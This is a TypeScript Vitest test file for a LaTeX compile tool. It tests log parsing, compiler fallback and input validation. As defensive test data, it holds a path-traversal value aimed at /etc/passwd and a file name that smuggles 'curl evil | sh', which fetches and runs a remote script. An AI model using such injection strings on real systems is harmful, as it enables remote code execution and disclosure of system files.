import { describe, it, expect, vi, beforeEach, afterEach } from 'vitest';
import { latexCompile, parseLatexOutput } from './latex.js';
import type { ToolExecutorContext } from './shared.js';

// ---------------------------------------------------------------------------
// Tests for latex.ts — latex_compile tool.
//
// Shell execution is stubbed via toolRuntime mock. Tests cover:
//   - disabled guard
//   - auto-detect failure (no .tex file found)
//   - file path validation
//   - parseLatexOutput: success, classic errors, inline errors, warnings
//   - happy path: errors formatted with line numbers
//   - no errors/warnings → success message
//   - compiler command routing (latexmk vs pdflatex)
// ---------------------------------------------------------------------------

function makeSession(stdout: string, exitCode = 0, throws?: Error) {
  return {
    execute: vi.fn(async () => {
      if (throws) throw throws;
      return { stdout, exitCode, timedOut: false };
    }),
    executeBackground: vi.fn(),
    checkBackground: vi.fn(),
    dispose: vi.fn(),
  };
}

function makeRuntime(session: ReturnType<typeof makeSession>) {
  return { getShellSession: vi.fn(() => session) };
}

function makeContext(latexEnabled: boolean, compiler = 'latexmk', session = makeSession('')): ToolExecutorContext {
  return {
    config: { latexEnabled, latexCompiler: compiler } as never,
    toolRuntime: makeRuntime(session) as never,
  } as ToolExecutorContext;
}

// Stub workspace so auto-detection can be tested
vi.mock('vscode', async (importOriginal) => {
  const mod = await importOriginal<typeof import('vscode')>();
  return {
    ...mod,
    workspace: {
      ...mod.workspace,
      findFiles: vi.fn().mockResolvedValue([]),
      workspaceFolders: [{ uri: { fsPath: '/workspace' } }],
      fs: { stat: vi.fn().mockRejectedValue(new Error('not found')) },
    },
  };
});

beforeEach(() => vi.clearAllMocks());
afterEach(() => vi.restoreAllMocks());

// ---------------------------------------------------------------------------
// parseLatexOutput unit tests (no mocks needed)
// ---------------------------------------------------------------------------

describe('parseLatexOutput', () => {
  it('returns success=true when output contains "Output written on"', () => {
    const out = parseLatexOutput('Output written on main.pdf (5 pages)', 'main.tex');
    expect(out.success).toBe(true);
    expect(out.pdfPath).toBe('main.pdf');
    expect(out.errors).toHaveLength(0);
  });

  it('returns success=false when errors are present (no Output written)', () => {
    const out = parseLatexOutput('! Undefined control sequence.\nl.42 \\badcmd', 'main.tex');
    expect(out.success).toBe(false);
    expect(out.errors).toHaveLength(1);
    expect(out.errors[0].message).toBe('Undefined control sequence.');
    expect(out.errors[0].line).toBe(42);
    expect(out.errors[0].file).toBe('main.tex');
  });

  it('parses the l.NNN context line for errors', () => {
    const out = parseLatexOutput('! LaTeX Error: File not found.\nl.5 \\usepackage{missing}', 'doc.tex');
    expect(out.errors[0].line).toBe(5);
    expect(out.errors[0].context).toBe('\\usepackage{missing}');
  });

  it('parses inline filename:line: message format', () => {
    const out = parseLatexOutput('./chapter.tex:42: Undefined control sequence.', 'main.tex');
    expect(out.errors).toHaveLength(1);
    expect(out.errors[0].file).toBe('./chapter.tex');
    expect(out.errors[0].line).toBe(42);
    expect(out.errors[0].message).toBe('Undefined control sequence.');
  });

  it('parses LaTeX Warning lines', () => {
    const out = parseLatexOutput("LaTeX Warning: Reference `fig:1' on page 2 undefined at lines 10.", 'main.tex');
    expect(out.warnings).toHaveLength(1);
    expect(out.warnings[0].message).toContain('Reference');
    expect(out.warnings[0].line).toBe(10);
  });

  it('parses Overfull \\hbox warnings', () => {
    const out = parseLatexOutput('Overfull \\hbox (12.3pt too wide) at lines 55--60.', 'main.tex');
    expect(out.warnings).toHaveLength(1);
    expect(out.warnings[0].message).toContain('Overfull');
  });

  it('handles multiple errors across the document', () => {
    const input = ['! Undefined control sequence.', 'l.10 \\foo', '', '! Missing } inserted.', 'l.20 }'].join('\n');
    const out = parseLatexOutput(input, 'main.tex');
    expect(out.errors).toHaveLength(2);
    expect(out.errors[0].line).toBe(10);
    expect(out.errors[1].line).toBe(20);
  });

  it('returns empty errors and warnings for clean compile output without "Output written"', () => {
    const out = parseLatexOutput('This is pdfTeX, Version 3.141 (TeX Live)', 'main.tex');
    expect(out.errors).toHaveLength(0);
    expect(out.warnings).toHaveLength(0);
    expect(out.success).toBe(false); // no "Output written on"
  });
});

// ---------------------------------------------------------------------------
// latexCompile integration tests
// ---------------------------------------------------------------------------

describe('latexCompile — guard paths', () => {
  it('returns disabled message when latexEnabled is false', async () => {
    const ctx = makeContext(false);
    const result = await latexCompile({}, ctx);
    expect(result).toContain('disabled');
  });

  it('returns error when no .tex file found and no file specified', async () => {
    const ctx = makeContext(true);
    const result = await latexCompile({}, ctx);
    expect(result).toContain('No .tex file found');
  });

  it('returns error when session.execute throws', async () => {
    const session = makeSession('', 0, new Error('pdflatex not found'));
    const ctx = makeContext(true, 'pdflatex', session);
    const result = await latexCompile({ file: 'main.tex' }, ctx);
    expect(result).toContain('LaTeX compilation failed');
    expect(result).toContain('pdflatex not found');
  });

  it('validates file path for traversal attempts', async () => {
    // Path-validation rejections THROW so the executor records is_error —
    // returned error strings were logged as successes, resetting bounce
    // streaks and satisfying gates (v0.119 dogfood finding).
    const ctx = makeContext(true);
    await expect(latexCompile({ file: '../../../etc/passwd' }, ctx)).rejects.toThrow('Invalid file path');
  });
});

describe('latexCompile — output formatting', () => {
  it('returns success message when compilation is clean', async () => {
    const session = makeSession('Output written on main.pdf (5 pages).');
    const ctx = makeContext(true, 'pdflatex', session);
    const result = await latexCompile({ file: 'main.tex' }, ctx);
    expect(result).toContain('successful');
    expect(result).toContain('main.pdf');
  });

  it('returns structured errors with file and line', async () => {
    const output = ['! Undefined control sequence.', 'l.42 \\badcmd'].join('\n');
    const session = makeSession(output);
    const ctx = makeContext(true, 'pdflatex', session);
    const result = await latexCompile({ file: 'main.tex' }, ctx);
    expect(result).toContain('1 error');
    expect(result).toContain('main.tex:42');
    expect(result).toContain('Undefined control sequence');
    expect(result).toContain('<details>');
  });

  it('includes warnings section when warnings are present', async () => {
    const output = "LaTeX Warning: Citation `foo' on page 1 undefined at lines 5.";
    const session = makeSession(output);
    const ctx = makeContext(true, 'pdflatex', session);
    const result = await latexCompile({ file: 'doc.tex' }, ctx);
    expect(result).toContain('warning');
    expect(result).toContain('Citation');
  });
});

describe('latexCompile — compiler routing', () => {
  it('uses pdflatex command when compiler config is pdflatex', async () => {
    const session = makeSession('Output written on main.pdf');
    const ctx = makeContext(true, 'pdflatex', session);
    await latexCompile({ file: 'main.tex' }, ctx);
    const calls = session.execute.mock.calls as unknown[][];
    // The actual compile command (last call with pdflatex)
    const compileCall = (calls as [string][]).find(([cmd]) => cmd.includes('pdflatex') && cmd.includes('main.tex'));
    expect(compileCall).toBeTruthy();
  });

  it('probes for latexmk first when compiler is latexmk', async () => {
    // latexmk probe returns success, then compile
    let callCount = 0;
    const session = {
      execute: vi.fn(async () => {
        callCount++;
        if (callCount === 1) return { stdout: 'Latexmk, version 4.77', exitCode: 0, timedOut: false };
        return { stdout: 'Output written on main.pdf', exitCode: 0, timedOut: false };
      }),
      executeBackground: vi.fn(),
      checkBackground: vi.fn(),
      dispose: vi.fn(),
    };
    const ctx = makeContext(true, 'latexmk', session as never);
    const result = await latexCompile({ file: 'main.tex' }, ctx);
    expect(session.execute).toHaveBeenCalledTimes(2);
    const calls = session.execute.mock.calls as unknown[][];
    expect((calls[0] as [string])[0]).toContain('latexmk --version');
    expect((calls[1] as [string])[0]).toContain('latexmk -pdf');
    expect(result).toContain('successful');
  });

  it('falls back to pdflatex when latexmk probe fails', async () => {
    let callCount = 0;
    const session = {
      execute: vi.fn(async () => {
        callCount++;
        if (callCount === 1) throw new Error('latexmk: not found');
        return { stdout: 'Output written on main.pdf', exitCode: 0, timedOut: false };
      }),
      executeBackground: vi.fn(),
      checkBackground: vi.fn(),
      dispose: vi.fn(),
    };
    const ctx = makeContext(true, 'latexmk', session as never);
    const result = await latexCompile({ file: 'main.tex' }, ctx);
    const calls = session.execute.mock.calls as unknown[][];
    const compileCall = (calls[1] as [string])[0];
    expect(compileCall).toContain('pdflatex');
    expect(result).toContain('successful');
  });
});

describe('latexCompile — shell-injection hardening', () => {
  it('rejects a file path with shell metacharacters before running anything', async () => {
    const session = makeSession('');
    const ctx = makeContext(true, 'pdflatex', session);
    const result = await latexCompile({ file: 'main.tex"; curl evil | sh; echo "' }, ctx);
    expect(result).toContain('shell metacharacters');
    expect(session.execute).not.toHaveBeenCalled();
  });

  it('single-quotes the file path in the compile command', async () => {
    const session = makeSession('Output written on main.pdf');
    const ctx = makeContext(true, 'pdflatex', session);
    await latexCompile({ file: 'paper/main.tex' }, ctx);
    const calls = session.execute.mock.calls as unknown[][];
    const compileCall = (calls as [string][]).find(([cmd]) => cmd.includes('pdflatex'));
    expect(compileCall![0]).toContain("'paper/main.tex'");
    expect(compileCall![0]).not.toContain('"paper/main.tex"');
  });
});
